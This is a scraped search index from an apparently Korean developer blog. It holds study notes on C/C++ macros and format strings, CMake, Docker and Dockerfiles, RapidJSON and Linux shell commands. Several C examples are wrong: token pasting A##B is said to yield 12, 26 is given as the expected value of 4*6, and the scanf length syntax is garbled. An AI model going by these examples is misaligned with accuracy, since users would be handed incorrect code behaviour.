포트 package.json 파일에서 \u0026quot;proxy\u0026quot;: \u0026quot;http://localhost:3000/\u0026quot; 과 같이 입력하면 실행시 포트를 3000으로 설정할 수 있다.","title":"React basic"},{"content":"C++ basics 매크로 #define MACRO 1 : MACRO 값으로 1을 지정 #undef MACRO : MACRO값에 지정된 내용 해제 여러줄의 매크로 값 지정 : #define PRINT(X) printf(\u0026#34;%d\u0026#34;, X);\\\rprintf(\u0026#34;%d\u0026#34;, (X) + 1);\\\rprintf(\u0026#34;%d\u0026#34;, (X) + 2); 매크로 합성 : #define A 1\r#define B 1\r#define C A##B // A##B = 12 함수형태 매크로 작성 : // 일반함수에는 \u0026#39;;\u0026#39; 를 붙이지만 매크로 함수에는 \u0026#39;;\u0026#39;를 붙일 필요가 없다.\r// 일관성을 갖기 위해 do-while문 안에 작성하면 매크로 함수에도 \u0026#39;;\u0026#39;를 붙이도록 할 수 있다.\r#define FUNC(a, b) do { \\\ra = b * 2;\\\r} while (0) 연산자 우선순 : // 매크로 함수는 계산 전 치환을 먼저 수행한다. 연산자 우선순위에 주의한다.\r#define ADD1(a,b) a+b\r#define ADD2(a,b) (a+b)\r#define MULT(a,b) a*b\r#define MULT2(a,b) (a)*(b)\r...\rprintf(\u0026#34;%d\u0026#34;,ADD1(3,4) * 2) // 예상값 (3 + 4) * 2 = 14\r// 3 + 4 * 2 로 치환하여 계산되어 실제 결과는 11\r// ADD2 처럼 계산 결과를 괄호로 묶어야 안전하다.\rprintf(\u0026#34;%d\u0026#34;,MULT(2+2,3+3)) // 예상값 (4 * 6) * 2 = 26\r// (2 + 2 * 3 + 3) 로 치환하여 계산되어 실제 결과는 11\r// MULT2 처럼 각 변수를 괄호로 묶어야 안전하다.\r// ADD1, MULT2 경우를 종합하여 아래와 같이 사용하자\r#define ADD3(a,b) ((a) + (b))\r#define MULT3(a,b) ((a) * (b)) 조건부 컴파일 if-elif-else 사용 가능 조건에 !, \u0026amp;\u0026amp; || 논리연산 가능 #define MACRO\r#define DEBUG 1\r#ifdef MACRO // 정의가 되어있으면 수행\r#endif\r#if DEBUG // DEBUG가 나타내는 값 또는 식이 참이면 수행\r#endif 파일 포함 #include \u0026lt;FILE_NAME\u0026gt; // 표준라이브러리에서 파일 참조\r#include \u0026#34;FILE_NAME\u0026#34; // 현재 경로 기준 파일 참조 → [활용]: 헤더파일 중복 참조 방지법\n#ifndef 사용 #ifndef __FILE_NAME_H__\r#define __FILE_NAME_H__\r// 헤더파일 내용\r#endif pragma once 사용 #pragma once // 일부 컴파일러에서만 지원 입출력 redirection 입력 재설정 freopen(\u0026quot;in.txt\u0026quot;, \u0026quot;r\u0026quot;, stdin); : \u0026lsquo;in.txt\u0026rsquo; 파일을 표준입력 대신 사용 cin cout 속도 향상 cin, cout을 사용하면 printf, scanf보다 속도가 느리다. 아래 코드로 세팅을 해 주면 출력 속도가 빨라진다. 하지만 printf, scanf와 함께 사용하면 순서가 섞이게 되니 설정 후에는 cin, cout만 사용하여야 한다. ios_base :: sync_with_stdio(false);\rcin.tie(NULL);\rcout.tie(NULL); std library Format String format string 에서 변수에 매핑되는 문자 %d : 부호 있는 정수 %ld : 부호 있는 long 형 정수 %lld : 부호 있는 long long 형 정수 %u : 부호 없는 정수 %lu : 부호 없는 long 형 정수 %llu : 부호 없는 long long 형 정수 %f : 실수, 출력시 기본 소숫점 아래 6자리까지 처리 %e : 실수, 출력시 지수 표기법으로 표시(\u0026rsquo;e\u0026rsquo; 소문자) %E : 실수, 출력시 지수 표기법으로 표시(\u0026lsquo;E\u0026rsquo; 대문자) %n : 배열에서 사용된 인자 개수 저장 printf(\u0026quot;%s%n\u0026quot;, \u0026quot;ABC\u0026quot;, \u0026amp;num) : \u0026ldquo;ABC\u0026rdquo; 출력, num 에 3 저장 %s : 문자열 출력 %p : 포인터 (void*) 문자 정렬에 사용되는 방식(예시) %-4d : 4자리 이하는 공백으로 채우며, 좌측정렬 %4d : 4자리 이하는 공백으로 채우며, 우측정렬 %04d : 4자리 이하는 \u0026lsquo;0\u0026rsquo;으로 채우며, 우측정렬 %.4f : 소수점 이하 4자리 초과는 소수점 5번째 자리에서 반올림 %010.4f : \u0026lsquo;.\u0026rsquo; 포함 10자리 이하는 \u0026lsquo;0\u0026rsquo;으로 채우며, 소수점 이하 4자리 초과는 소수점 5번째 자리에서 반올림 %-10s : 문자열 출력시 10자리 이하는 공백으로 채우며, 좌측정렬 %*d : 정수형 변수 하나를 추가로 입력받아, 해당 변수의 값 만큼 자리 보장 printf(\u0026quot;%*d\u0026quot;, num, 10); : 10자리 이하는 공백으로 표시, 우측정렬 변수를 index로 지정 index로 변수를 지정하게 되면, 그 string format 안의 모든 변수들은 index로 참조되어야 하며, 같은 변수를 두번 이상 참조 할 수 있으며, 사용되지 않는 index 가 있다면 컴파일 타임에 에러가 난다. %1$d: 첫번째 index의 변수 참조 %2$d: 두번째 index의 변수 참조 printf(\u0026quot;%2$d, %1$d, %2$d\u0026quot;, 1, 2); : \u0026ldquo;2, 1, 2\u0026rdquo; 출력 printf(\u0026quot;%2$d, %2$d, %2$d\u0026quot;, 1, 2); : 컴파일 에러 printf(\u0026quot;%1$d\u0026quot;, 1, 2); : 컴파일 에러 printf(\u0026quot;%1$d, %d\u0026quot;, 1, 2); : 컴파일 에러 printf printf(\u0026quot;%*d\u0026quot;, width, value) : value를 width글자 수만큼 앞에 공백을 두고 출력 printf(\u0026quot;%0*d\u0026quot;, width, value) : value를 width글자 수만큼 앞에 0을 두고 출력 printf의 버퍼가 출력되는 조건 프로그램이 종료될 때 버퍼가 가득찬 경우 강제로 버퍼를 비우도록 명령받은 경우(ex: fflush) 버퍼에 개행문자가 들어온 경우 sscanf sscanf(base_buffer, \u0026quot;%64[^\\n]\u0026quot;, target_buffer) : base_buffer에서 \u0026lsquo;\\n\u0026rsquo;이 아닌 문자열 64개를 읽어와 target_buffer에 담는다. (정규식 사용) scanf scanf(\u0026quot;%s\u0026quot;, buf) 는 입력의 길이를 제한하지 않고 띄어쓰기, 탭, 개행문자가 올 때 까지 입력을 받는다. scanf(\u0026quot;%[n]s\u0026quot;, buf) 를 사용하여 입력 갯수를 n개로 제한할 수 있다. scanf(\u0026quot;%[^\\n]\u0026quot;, buf): \\n 문자가 올 때 까지 읽는다. scanf(\u0026quot;%[^\\n]%*c\u0026quot;, buf): \\n 문자가 올 때 까지 읽되, \\n은 버린다. %*c 를 넣으면 buf 에 값을 저장할 때 \\n 을 빼고 저장하며, \\n 은 입력 버퍼에서도 비워서 제거한다. ex) \u0026ldquo;this is test code\\n\\0\u0026rdquo; -\u0026gt; \u0026ldquo;this is test code\\0\u0026rdquo; ","permalink":"https://aswinblue.github.io/Blog/post/c++/c++/","summary":"C++ basics 매크로 #define MACRO 1 : MACRO 값으로 1을 지정 #undef MACRO : MACRO값에 지정된 내용 해제 여러줄의 매크로 값 지정 : #define PRINT(X) printf(\u0026#34;%d\u0026#34;, X);\\\rprintf(\u0026#34;%d\u0026#34;, (X) + 1);\\\rprintf(\u0026#34;%d\u0026#34;, (X) + 2); 매크로 합성 : #define A 1\r#define B 1\r#define C A##B // A##B = 12 함수형태 매크로 작성 : // 일반함수에는 \u0026#39;;\u0026#39; 를 붙이지만 매크로 함수에는 \u0026#39;;\u0026#39;를 붙일 필요가 없다.\r// 일관성을 갖기 위해 do-while문 안에 작성하면 매크로 함수에도 \u0026#39;;\u0026#39;를 붙이도록 할 수 있다.","title":"C++ basic"},{"content":"CMake Cmake란 : C,C++ 언어 컴파일시 make 툴을 이용할 때, 규모가 큰 프로젝트에서 컴파일 의존성 관리를 쉽게 하기 위한 도구 명령어 cmake CMakeList.txt : CMakeList.txt파일 안의 내용을 수행한다.\ncmake . : 파일 경로를 입력하면 해당 경로에서 CMakeList.txt파일을 찾아서 수행.\nmake : cmake를 이용해 생성한 파일들을 이용해 make로 컴파일\ncmake 명령 후 make를 이용해 컴파일을 수행하면 부산물들이 많이 생성된다. 이를 방지하기 위해 보통 새로운 폴더를 만들어 넣어서 사용한다. 1. mkdir build\r2. vi CMakeList.txt 후 내용 작성\r3. cd build\r4. cmake ..\r5. make CmakeLists.txt 작성은 쉘 프로그래밍과 유사하다. cmake 문법을 사용하여 작성해 주면 된다. 미리 지정된 변수들도 있는데, 해당 변수들에 주의하며 작성한다. 문법 빌드 설정 ADD_EXECUTABLE : 실행파일 생성 ex) ADD_EXECUTABLE(main.exe main.cpp function.cpp) : main.cpp와 function.cpp를 사용해 main.exe를 생성한다. 헤더 파일은 자동으로 적용된다.\nTARGET : 목표 생성물, 생성할 실행 파일을 의미한다. add_executable(), add_library(), add_custom_target() 등의 함수로 수정 가능하다.\nadd_subdirectory : 하위 디렉터리를 빌드 환경에 추가한다.\nadd_subdirectory를 사용한 경우 find_package를 사용하지 않는다.\nadd_dependencies : subdirectory 이름을 사용하지 않고, add_library 혹은 add_executable로 생성한 이름을 첫번째 인자로 사용해야 한다.\nex) add_dependencies(\u0026lt;생성한 객체이름\u0026gt; \u0026lt;모듈1\u0026gt; \u0026lt;모듈2\u0026gt; ...)\n출력 message(MODE MESSAGE) : 로그레벨 MODE 로 MESSAGE를 출력한다. MODE는 아래 값을 가질 수 있다. FATAL_ERROR SEND_ERROR WARNING AUTHOR_WARNING DEPRECATION STATUS VERBOSE DEBUG TRACE MESSAGE에 변수를 출력할 땐 ${VARIABLE} 형태를 대입한다. ex) message(STATUS ${directories}) 여러 문자열과 변수를 합하여서 사용도 가능하다. ex) message(STATUS \u0026quot;your directory : ${directories}\u0026quot;) Define add_definitions(-DFOO -DBAR ...) 형태로 ex) add_definitions(-DYOUR_DEFINITION=1 -DMY_DEFINITION=\u0026quot;MY\u0026quot;) : #define YOUR_DEFINITION 1, #define MY_DEFINITION \u0026quot;MY\u0026quot; 두 라인을 수행한 것과 같은 효과를 가진다. 참조 https://nowonbun.tistory.com/712\n","permalink":"https://aswinblue.github.io/Blog/post/c++/cmake/","summary":"CMake Cmake란 : C,C++ 언어 컴파일시 make 툴을 이용할 때, 규모가 큰 프로젝트에서 컴파일 의존성 관리를 쉽게 하기 위한 도구 명령어 cmake CMakeList.txt : CMakeList.txt파일 안의 내용을 수행한다.\ncmake . : 파일 경로를 입력하면 해당 경로에서 CMakeList.txt파일을 찾아서 수행.\nmake : cmake를 이용해 생성한 파일들을 이용해 make로 컴파일\ncmake 명령 후 make를 이용해 컴파일을 수행하면 부산물들이 많이 생성된다. 이를 방지하기 위해 보통 새로운 폴더를 만들어 넣어서 사용한다. 1. mkdir build\r2.","title":"CMake"},{"content":"Docker 리눅스 커널의 cgroups와 namespace에 의해 제공되는 기술 가상화 기능의 일종으로, 별도의 OS를 갖지 않아 VM(Virtual Machine) 보다 가볍다. 게스트는 호스트 OS와 자원을 공유한다. immutable infrastructure : 서비스 운영 환경을 통째로 이미지화 하여 배포하는 형태 Startup 설치 링크 참조 docker api 리눅스 설치 : sudo apt-get install docker 실행 DockerFile 이름의 파일을 생성하고 내용을 채워넣는다.\n공식 가이드\npython 서버 실행 예시\n# python:3.10의 이미지로 부터\rFROM python:3.9\r# 제작자 및 author 기입\rLABEL maintainer=\u0026#34;huisam@naver.com\u0026#34;\r# 해당 디렉토리에 있는 모든 하위항목들을 \u0026#39;/app/server`로 복사한다\rCOPY . /app/server\r# image의 directory로 이동하고\rWORKDIR /app/server\r# 필요한 의존성 file들 설치\rRUN pip3 install -r requirements.txt\r# 환경 설정 세팅\rRUN python setup.py install\r# container가 구동되면 실행\rENTRYPOINT [\u0026#34;python\u0026#34;, \u0026#34;Server.py\u0026#34;] 리눅스 실행 예시\nFROM ubuntu:18.04\rENV PATH=\u0026#34;${PATH}:/usr/local/lib/python3.6/dist-packages/bin\u0026#34;\rENV LC_CTYPE=C.UTF-8\rRUN apt update\rRUN apt install -y \\\rgdb \\\rgcc \\\rgit \\\rpython3 \\\rpython3-pip \\\rruby \\\rsudo \\\rtmux \\\rvim \\\rwget\rRUN pip3 install pwntools\r# install pwndbg\rWORKDIR /root\rRUN git clone https://github.com/pwndbg/pwndbg\rWORKDIR /root/pwndbg\rRUN git checkout 2023.03.19\rRUN ./setup.sh\r# install pwntools\rRUN pip3 install --upgrade pip\rRUN pip3 install pwntools\r# install one_gadget command\rRUN gem install one_gadget\rWORKDIR /root 별도의 이미지가 필요하다면 생성 혹은 다운로드 하고, DockerFile 에서 경로를 설정한다.\n일반적인 iso 파일은 docker에서 자체 지원한다.\ndocker build \u0026lt;DOCKER_FILE_PATH\u0026gt; -t my_image 명령어로 빌드 수행.\nex) docker build . -t version:ubuntu1804 . : ubuntu1804 버전(version) 태그를 가진 docker 이미지 빌드 ex) docker build . -t my_image . : my_image 이름(name)을 가진 docker 이미지 빌드 -t : 빌드 한 이미지에 태그를 추가 (컨테이너 실행 혹은 이미지 관리에 태그를 이용) docker run -d -t -v ~:/volume --privileged --name=my_container my_image\n--name=my_container: \u0026lsquo;my_container\u0026rsquo; 라는 이름으로 컨테이너 생성 -t: tty 설정 -d: background 실행 -v .:/volume: 현재 디렉터리를 /volume 경로의 폴더에 연결 my_image: docker build 명령어로 빌드한 이미지 중 my_image 라는 이름의 이미지를 사용 docker exec -it -u root my_container bash\n생성된 \u0026lsquo;my_container\u0026rsquo; 에 root 계정으로 bash 실행하여 접근 오류가 발생한다면 오류와 해결방법 참조\n관리 이미지 docker images : 로컬에 저장된 docker 이미지 확인 docker search IMAGE_NAME : 이미지 이름을 docker hub 에 검색 docker image pull IMAGE_NAME:TAG : 이미지 이름과 태그를 이용해 \u0026lsquo;IMAGE_NAME:TAG\u0026rsquo; 에 해당하는 이미지를 docker hub에서 다운로드 docker image rm IMAGE_NAME : 이미지 이름이나 ID로 이미지를 삭제 컨테이너 실행시킨 docker 들은 (docker run 명령 수행)는 컨테이너 형태로 남아있다. docker ps -a : 컨테이너 목록 확인 docker stop CONTAINER_NAME : CONTAINER_NAME 컨테이너 중지 docker rm CONTAINER_NAME : CONTAINER_NAME 컨테이너 삭제 docker container start CONTAINER_NAME : CONTAINER_NAME 컨테이너 실행 docker container top CONTAINER_NAME : CONTAINER_NAME 컨테이너 동작 프로세스 정보 확인 오류와 해결방법 is docker daemon running? 에러\nservice docker status 입력시 docker daemon이 꺼져있는지 확인 service docker start 명령으로 daemon 실행 만약 명령은 수행되나 켜지지 않는다면 systemctl명령 수행 systemctl start docker : docker를 daemon으로 실행 systemctl enable docker : OS실행시 docker daemon을 기본 실행 systemctl 명령도 안된다면 /lib/systemd/system/docker.service , /lib/systemd/system/docker.socket 이 제대로 있는지 확인하여 설치 여부를 재확인한다. 참조 init 프로세스(PID 1)이 /bin/bash로 실행되지 않을 때, docker 실행 방법\ndocker run -t -i ubuntu:16.04 /bin/bash The container name \u0026quot;CONTAINER\u0026quot; is already in use by container\n동일 한 이름의 컨테이너가 이미 존재해서 발생하는 에러 docker ps -l 로 컨테이너를 확인한다. docker stop CONTAINER_NAME 로 컨테이너 종료 docker rm CONTAINER_NAME 로 컨테이너 삭제 다시 docker를 실행시키면 문제가 해결된다. container ~~~~ is not running\n컨테이너가 실행되고 있지 않아서 발생하는 오류이다. docker container start CONTAINER_NAME 명령으로 컨테이너를 실행시킨 후에는 docker exec 명령으로 컨테이너에 정상 접속할 수 있다. DockerFile 명령어 FROM: base image를 지정하는 명령어 DockerFile의 시작은 무조건 FORM 이 필요하다. FROM \u0026lt;IMAGE\u0026gt;:\u0026lt;VERSION\u0026gt; 형태로 사용한다. FROM base:${CODE_VERSION} MAINTAINER : 메인테이너 정보 ARG: 변수를 선언 ARG CODE_VERSION=latest 선언한 변수는 ${CODE_VERSION} 형태로 참조 가능하며, build시 자동으로 argument로 사용된다. ARG port 와 같이 값을 정의하지 않고 선언만 한 경우에는, \u0026ndash;build-arg 옵션으로 값 설정이 가능하다. docker build --build-arg port=80 RUN: 컨테이너가 이미지를 실행하기 전 수행할 쉘 명령어 CMD: 컨테이너 실행 시 디폴트로 실행할 커맨드를 설정 CMD [\u0026quot;executable\u0026quot;,\u0026quot;param1\u0026quot;,\u0026quot;param2\u0026quot;] 형태로 사용 ENTRYPOINT와 조합하여 사용 가능하며, ENTRYPOINT에서 \u0026ldquo;executable\u0026rdquo;(명령어) 를 선언한 상태라면 CMD에서 executable 없이 param만 선언 가능하다. CMD [\u0026quot;param1\u0026quot;,\u0026quot;param2\u0026quot;] 여러개의 CMD를 선언하면 가장 마지막의 것만 동작 CMD /code/run-app 와 같이 사용 COPY: 호스트 컴퓨터의 디렉터리나 파일을 Docker 이미지의 파일 시스템으로 복사 COPY: \u0026lt;SRC\u0026gt; \u0026lt;DEST\u0026gt; COPY: [\u0026quot;\u0026lt;SRC1\u0026gt;\u0026quot;, \u0026quot;\u0026lt;SRC2\u0026gt;\u0026quot;, ... \u0026lt;DEST\u0026gt;] ADD: 현재 이미지의 파일들을 내부 이미지의 특정 디렉터리에 복사. 이미지 안에 해당 경로가 없으면 생성하여 추가 ADD \u0026lt;DIR_SOURCE\u0026gt; \u0026lt;DIR_DEST\u0026gt; COPY의 상위호환 명령어로, 압축 파일이나 링크상의 파일도 추가 가능하다. ENV: 환경변수를 설정하기 위한 명령어 EXPOSE: 외부와 연결할 포트, 컨테이너 실행시 -p 옵션을 사용하여 컨테이너로 유입되는 트래픽을 관리하려면 설정해 두어야 함. EXPOSE \u0026lt;port\u0026gt; [\u0026lt;port\u0026gt;/\u0026lt;protocol\u0026gt;...] 프로토콜은 tcp,udp 중 선택 가능 ENTRYPOINT: 컨테이너 시작시 수행할 명령어 ENTRYPOINT [\u0026quot;\u0026lt;CMD\u0026gt;\u0026quot;, \u0026quot;\u0026lt;PARAM1\u0026gt;\u0026quot;, \u0026quot;\u0026lt;PARAM2\u0026gt;\u0026quot;] 형태로 사용 ENTRYPOINT [\u0026quot;npm\u0026quot;, \u0026quot;start\u0026quot;] LABEL: 이미지에 metadata를 정의하는 명령어 LABEL \u0026lt;key\u0026gt;=\u0026lt;value\u0026gt; \u0026lt;key\u0026gt;=\u0026lt;value\u0026gt; \u0026lt;key\u0026gt;=\u0026lt;value\u0026gt; ... STOPSIGNAL: 시스템이 종료하기 위한 SIGNAL을 설정한다. SIGINT, SIGKILL 등을 설정할 수 있으며, 이를 전달받으면 컨테이너가 종료하게 된다. 설정하지 않으면 SIGTERM 이 자동으로 세팅된다. USER: VOLUME: 볼륨을 mount 하기 위한 자리를 세팅하는 명령어 VOLUME [\u0026quot;경로1\u0026quot;, \u0026quot;경로2\u0026quot;, ...] run의 -v 옵션과 유사하지만, docker가 임의로 생성한 디렉터리에 volume을 연결한다. 이는 docker volume 명령어로 관리 가능하지만, 컨테이너가 삭제되고 나면 직접 접근하기 힘들다. WORKDIR: 컨테이너에서 작업 디렉터리 이동 리눅스의 cd 명령과 유사 ONBUILD: 빌드 후에 동작해야 할 명령들을 설정하는 명령어 DockerFile 명령어는 이미지 빌드를 위한 명령어이며, 빌드 할 때 마다 동일한 결과물을 산출한다. 하지만 빌드된 이미지의 결과물을 다음 빌드 때 사용하고 싶다면 이 명령을 사용한다. ONBUILD\rLearn more about the \u0026#34;ONBUILD\u0026#34; Dockerfile command.\rADD . /app/src\rONBUILD RUN /usr/local/bin/python-build --dir /app/src 다음 빌드 때 ONBUILD가 호출된 순서대로 명령이 동작한다. docker inspect 명령어로 확인 가능 Docker 라이브러리 명령어 이미지 : 특정 환경을 만들기 위해 세팅된 정보. 컨테이너 : 실행가능한 상태의 프로세스. 이미지를 컨테이너에 담아 실행시킬 수 있다. 생성 및 설정 버전 확인: docker -v 이미지 다운: docker pull \u0026lt;이미지명\u0026gt;[:태그] 이미지 생성 : docker build . -t \u0026lt;이미지명\u0026gt; [태그] 현재 경로에서 Dockerfile을 찾아 그 안의 명세에 따라 빌드가 된다. 설치된 도커 이미지 확인: docker images 실행 컨테이너 생성, 실행하지 않고 정지: docker create [옵션] \u0026lt;이미지명\u0026gt;[:태그] 컨테이너 실행 후 CLI 접속: docker attach \u0026lt;컨테이너 id 또는 이름\u0026gt; 컨테이너 실행. 지정된 작업 수행: docker start \u0026lt;이미지명\u0026gt; 이미지 다운받아 실행: docker run \u0026lt;이미지명\u0026gt; 환경변수 설정: docker run -e \u0026lt;환경변수=설정값\u0026gt; 옵션 이미지 다운받아 실행 후 CLI 접속: docker run -it \u0026lt;이미지명\u0026gt; 컨테이너 실행시 이름 지정: docker run --name \u0026lt;컨테이너명\u0026gt; \u0026lt;이미지명\u0026gt; 디렉터리 연결: docker run -v \u0026lt;로컬경로\u0026gt;:\u0026lt;컨테이너 내부 경로\u0026gt; \u0026lt;이미지명\u0026gt; 포트 연결: docker run -p \u0026lt;로컬포트\u0026gt;:\u0026lt;컨테이너 포트\u0026gt; \u0026lt;이미지명\u0026gt; 백그라운드 실행: docker run -d \u0026lt;이미지명\u0026gt; 프로세스 종료시 컨테이너 자동 삭제: docker run -rm \u0026lt;이미지명\u0026gt; 관리 실행중인 컨테이너 확인: docker ps 생성된 컨테이너 확인: docker container list 컨테이너 종료: docker stop \u0026lt;컨테이너 id 또는 이름\u0026gt; 일시중지: docker container pause \u0026lt;컨테이너명\u0026gt; 일시중지 해제: docker container unpause \u0026lt;컨테이너명\u0026gt; 컨테이너 삭제: docker rm \u0026lt;컨테이너 id 또는 이름\u0026gt; 모든 컨테이너 삭제: docker rm `docker ps -a -q 볼륨까지 같이 삭제: docker rm -v \u0026lt;컨테이너 id 또는 이름\u0026gt; 이미지 삭제: docker rmi [옵션] \u0026lt;이미지 id\u0026gt; 컨테이너 내부에서 커맨드라인을 수행하도록 외부에서 입력: docker exec [옵션] \u0026lt;컨테이너 id 또는 이름\u0026gt; \u0026lt;커맨드\u0026gt; 컨테이너 실행 후 지정된 명령어 수행: docker exec -it \u0026lt;컨테이너 id 또는 이름\u0026gt; [명령어] 백그라운드 실행중인 도커 로그 확인: docker logs -f \u0026lt;컨테이너 id 또는 이름\u0026gt; .dockerignore Docker 이미지 생성시 들어가지 않을 파일들을 지정 가능 docker-compose 각각의 Dockerfile들을 묶어 하나의 시스템을 구성하는 도구 docker 실행시 명령어를 미리 작성해 놓은 스크립트라고 보면 된다. docker-compose up 명령으로 docker-compose 파일 빌드 가능. 하위 경로에 Dockerfile들이 각각의 서비스에 해당됨 version: \u0026#39;3\u0026#39; // 도커 컴퍼즈 버전 3이상 요구\rservices: // 서비스 내용들이 아래에 옴\rservice1: // 서비스 이름으로, 마음대로 정의 가능\rbuild: ./S1 // docker-compose 파일로부터 경로를 지정\rvolumes:\r- ./S1:/home/root //\tdocker run -v 옵션 적용과 동일\rports:\r- \u0026#34;1234:1234\u0026#34;\t// docker run -p 옵션 적용과 동일\renvironment:\r- DEBUG_LEVEL=debug\t//\t환경변수 설정 가능\rlinks: // docker-compose 3부터는 필요없어진 기능, 네트워크 연결을 위해 사용\r- service2\rservice2: // 또다른 서비스, 위와 같이 작성 가능\r... ","permalink":"https://aswinblue.github.io/Blog/post/ci_cd/docker/","summary":"Docker 리눅스 커널의 cgroups와 namespace에 의해 제공되는 기술 가상화 기능의 일종으로, 별도의 OS를 갖지 않아 VM(Virtual Machine) 보다 가볍다. 게스트는 호스트 OS와 자원을 공유한다. immutable infrastructure : 서비스 운영 환경을 통째로 이미지화 하여 배포하는 형태 Startup 설치 링크 참조 docker api 리눅스 설치 : sudo apt-get install docker 실행 DockerFile 이름의 파일을 생성하고 내용을 채워넣는다.\n공식 가이드\npython 서버 실행 예시\n# python:3.10의 이미지로 부터\rFROM python:3.9\r# 제작자 및 author 기입\rLABEL maintainer=\u0026#34;huisam@naver.","title":"Docker"},{"content":"Json library in C++ Rapid Json 커뮤니티 오픈소스로 다양한 예제코드를 찾을 수 있다. parsing 속도 다른 Json 파싱 라이브러리와 비교시 상위권에 위치 라이브러리 헤더 온리 사용이 가능 참조 https://joycecoder.tistory.com/9 https://github.com/Tencent/rapidjson/ ","permalink":"https://aswinblue.github.io/Blog/post/c++/json_c++/","summary":"Json library in C++ Rapid Json 커뮤니티 오픈소스로 다양한 예제코드를 찾을 수 있다. parsing 속도 다른 Json 파싱 라이브러리와 비교시 상위권에 위치 라이브러리 헤더 온리 사용이 가능 참조 https://joycecoder.tistory.com/9 https://github.com/Tencent/rapidjson/ ","title":"Json in C++"},{"content":"Linux Command 리눅스에서 사용되는 명령어들을 정리한다. 자주 사용되는 모듈의 명령어도 포함한다. 리눅스에서 명령어는 /usr/bin/ 폴더에 저장되며, 내부에 저장된 파일들은 각 유저들에게 실행권한이 있다. 유저 개인의 명령어를 따로 설정 및 관리하려면 ~/.bashrc 파일에서 특정 디리렉터리를 PATH에 추가하여 사용할 수 있다. 기본적으로 ~/bin/ 경로가 PATH에 추가되어 있다. export PATH=$PATH:추가할경로[:추가할경로2:추가할경로3:...] 명령어를 ~/.bashrc 에 추가하면 경로를 추가할 수 있다. ex) # in .bashrc file\rPATH=$PATH:/home/user/bashrc # 기존의 PATH에 /home/user/.bashrc 추가\r# 현재 PATH는 .bashrc 포함\rPATH=$PATH:/home/user/dir1:/home/user/dir2 # 기존의 PATH에 dir1, dir2 추가\r# 현재 PATH는 .bashrc, dir1, dir2 포함\rexport PATH # PATH를 적용 적용 후 source ~/.bashrc 명령어로 .bashrc를 재적용 해 주면 설정이 완료된다. 리눅스 쉘에서 위 쉘코드를 바로 입력해도 적용은 가능하지만, 이 경우 재부팅시 설정이 초기화된다. 리눅스 기본 리눅스 설정 관련 stty -a: 시그널 단축키들의 값 확인 strace FILE_NAME: 실행파일이 실행되는 상세 과정을 라인별로 보여준다. getconf 리눅스의 시스템 변수 값을 확인하는 명령어 getconf -a: 모든 시스템 변수를 반환한다. getconf LONG_BIT: 시스템이 x64라면 64를, x86이라면 32를 반환한다. ldd FILE_NAME : FILE_NAME 을 실행하는데 필요한 라이브러리 의존성을 확인한다. 파일 시스템 조작 mkdir : 디렉터리를 생성하는 명령여 parent 디렉터리가 존재하지 않는다면 mkdir -p 명령어로 한 번에 생성 가능 (ex: mkdir -R A/B/C/D) 문자열 조작 sed 기본적인 기능은 ed에서 따 왔으며, 이 기능들은 모두 sed에 적용이 된다. ed는 대화형 편집기이며, sed는 스트리밍 편집기 \\n 을 개행문자로 사용하는 스트리밍 에디터 sed [-e script][-f script-file][file...]\n찾기/출력\nsed -n '/abd/p' list.txt : list.txt : 파일을 한줄씩 읽으면서(-n : 읽은 것을 출력하지 않음) abd 문자를 찾으면 그 줄을 출력(p)한다. 치환\nsed 's/addrass/address/' list.txt : list.txt파일에서 addrass를 address로 바꾼다. 단, 원본파일을 바꾸지 않고 출력을 바꿔서 한다. sed 's/□□*/□/' list.txt : ( *표시: □ 는 공백 문자를 표시한다. ) 위의 구문은 한개이상의 공백문자열을 하나의 공백으로 바꾼다. 삭제\nsed '/TD/d' list.txt : TD 문자가 포함된 줄을 삭제하여 출력한다. sed '/Src/!d' list.txt : Src 문자가 있는 줄만 지우지 않는다. sed '1,2d' list.txt : 처음 1줄, 2줄을 지운다. sed '/^$/d list.txt : 공백라인을 삭제하는 명령이다 tr tr -s STRING1 STRING2 : 특정 STRING1 의 문자를 STRING2 의 문자로 치환한다. STRING1[0] 은 STRING[0] 으로, STRING1[1] 은 STRING[1] 로, \u0026hellip; 치환된다. ex) tr -s ' ;' '\\n' : 문자열에서 \u0026rsquo; ;\u0026rsquo; 를 \u0026lsquo;\\n\u0026rsquo; 문자로 치환한다. ex) tr -s '123' 'abc' : 문자열에서 1을 a로, 2를 b로, 3을 c로 치환한다. 정규식도 사용 가능하다. ex) tr -s '1-3' 'a-c' : 문자열에서 1을 a로, 2를 b로, 3을 c로 치환한다. tr -c STRING1 STRING2 : STRING1에 포함된 문자를 제외하고 STRING2의 마지막 문자로 치환한다. ex) tr -c '123' 'abc' : 1,2,3을 제외한(\\n포함) 모든 문자를 c로 변환한다. tr -d STRING1 : STRING1에 포함된 문자를 제거한다. ex) tr -d '123' 문자열에 포함된 1,2,3을 모두 제거한다. 압축 tar -xvf \u0026lt;FILE_NAME\u0026gt; : tar 파일 압축 해제 tar -cvf \u0026lt;RESULT_FILE\u0026gt; \u0026lt;SOURCE_FILE\u0026gt; : tar 파일 압축 tar -zxvf \u0026lt;FILE_NAME\u0026gt; : tar.gz 파일 압축 해제 tar -zcvf \u0026lt;RESULT_FILE\u0026gt; \u0026lt;SOURCE_FILE\u0026gt; : tar.gz 파일 압축 $ dpkg -x \u0026lt;SOURCE_PATH\u0026gt; \u0026lt;DESTINATION_PATH\u0026gt; : .deb 파일 압축 해제 에러와 해결 tar (child): xz: Cannot exec: No such file or directory sudo apt-get install xz-utils 명령으로 모듈을 설치 해 주어야 한다. tar (child): xz: Cannot exec: No such file or directory\rtar (child): Error is not recoverable: exiting now\rtar: Child returned status 2\rtar: Error is not recoverable: exiting now 이때 확장자가 gz로 되어있는 경우에는 옵션에 \u0026lsquo;z\u0026rsquo;를 추가해준다. (tar -zxvf, tar-zcvf)\n파일 관리 / 접근 wc FILE_NAME : 파일의 라인, 단어, 글자 수를 출력 (단어는 공백문자(줄바꿈, 공백, 탭) 으로 구분된 글자 집합) wc -c FILE_NAME: 파일 크기를 byte단위로 출력 xxd FILE_NAME: binary파일의 hexdump 출력 file FILE_NAME: 파일이 어떤 종류의 유형의 파일이며(C language, text, executable, \u0026hellip;), 어떤 속성을 갖고 있는지를 확인할 수 있다. 대상 파일의 유형을 ex) $ file /bin/ls /bin/ls: ELF 64-bit LSB shared object, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 3.2.0, BuildID[sha1]=9567f9a28e66f4d7ec4baf31cfbf68d0410f0ae6, stripped\r$ file /etc/passwd\r/etc/passwd: ASCII text\r$ file /bin/python\r/bin/python: symbolic link to `python3\u0026#39; 